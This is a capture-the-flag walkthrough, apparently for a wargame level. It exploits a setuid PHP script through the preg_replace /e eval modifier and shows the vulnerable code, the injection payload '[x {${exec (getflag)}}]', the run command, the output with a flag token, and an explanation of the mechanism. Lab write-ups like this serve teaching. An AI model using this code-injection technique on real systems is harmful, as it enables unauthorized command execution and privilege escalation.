On arrival, launch : `ls -la`
We can see two files, one is a binary/executable, the other one is the riginal script :
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
The owner is flag06, with all rights (read/write/execute).
As level06 we can only read and execute the binary, and read the php file.

If we execute the script (on level06.php, for example), we can see it'll print the content of the file.
The content of `level06.php` is difficult to read. Let's clean it by copying it inside our own environment : ` scp -P4242 level06@[VM_IP]:level06.php 'level06.php'`

level06.php cleaned up :
#!/usr/bin/php
<?php
function y($m) {
$m = preg_replace("/\./", " x ", $m);
$m = preg_replace("/@/", " y", $m);
return $m;
}

function x($y, $z) {
$a = file_get_contents($y);
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
$a = preg_replace("/\[/", "(", $a);
$a = preg_replace("/\]/", ")", $a);
return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>

So we know that the `x()` function takes two params. It also gets the content from the file (as first arg), then proceeds to look for a specific pattern inside it ("[x (.*)]"), then substitutes this portion of the string with the second section of the preg_replace function ("y(\2)";
At first I really didn't understand any of it. I wondered why the program would want to substitute "[x (.*)]" with "y(\2)". I also wondered why there was a `y()` function in the file if it wasn't going to be used.

I looked around for the `\e` modifier, then it clicked :
The `\e` modifier is used in order to evaluate ("PREG_REPLACE_EVAL") the substitution as PHP code, so basically we could run code from inside the function.

Then, I understood that the `y()` function was actually called in the first call to `preg_replace($pattern, $substitution (here, the `y()` function), $string/subject)`. Basically, the \e modifier is used to execute the content from the `y()` function, after replacing its content with the `y()` function's `preg_replace()`.

I searched for a way to execute bash/sh commands from PHP scripts. It is done using `exec (expression)`. We can use it to launch `getflag` as user flag06.

With these informations, all we have to do is create a pattern that will trigger the regex and execute the `getflag` command :
=> echo '[x {${exec (getflag)}}]' > /tmp/flagphp`
=> ./level06 /tmp/flagphp
=> Output :
=> PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1

Retrieve the flag.

How the `$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);` actually works :
"[x (.*)]" => matches "[x (everything inside)]"
"/e" modifier => substitutes the pattern normally (with the second arg) then runs the result as PHP code
"y(\2)" => calls the `y()` function/substitutes the text captured by the n'th parenthesized item (comes in \n or $n, here it's {exec (getflag)}) (and then the code will be executed thanks to the \e modifier inside the `x()`'s preg_replace)

In PHP 7.x.x, the `\e` has been removed completely (probably because of exploit issues). Under PHP 5.x.x it is deprecated, and launches a warning when used.

See : https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php
https://www.php.net/manual/en/function.exec.php
https://www.php.net/manual/en/function.preg-replace.php
